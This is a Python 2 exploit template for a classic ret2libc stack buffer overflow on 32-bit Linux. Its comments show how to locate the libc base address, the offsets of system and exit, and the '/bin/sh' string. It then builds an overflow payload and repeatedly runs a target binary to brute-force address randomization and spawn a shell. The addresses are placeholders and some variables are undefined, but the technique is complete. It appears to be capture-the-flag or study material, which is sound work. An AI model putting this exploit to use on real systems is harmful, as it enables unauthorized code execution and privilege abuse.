import struct
from subprocess import call

#ldd bin | grep libc
libc_base = libc_addr

#readelf -s /lib/i386-linux-gnu/libc.so.6| grep system
#choose system of libc
system_offset = 0x0

#readelf -s /lib/i386-linux-gnu/libc.so.6| grep exit
#choose exit of libc
exit_offset = 0x0

#strings -a -t x /lib/i386-linux-gnu/libc.so.6| grep /bin/sh
shell_offset = 0x0

system = struct.pack("<I", libc_base + system_offset)

exit = struct.pack("<I", libc_base + exit_offset)

shell=struct.pack("<I", libc_base + shell_offset)

# find exploit point:
  # generate_pattern
  # debug with the patern
  # offset_pattern with the address
buf = 'A' * offset
buf += system
buf += exit
buf += shell

#x should be calculated with the stack randomization
while i < x:
    i+=1
    print "Try: %s" % i
    call(["binarypath", buf])
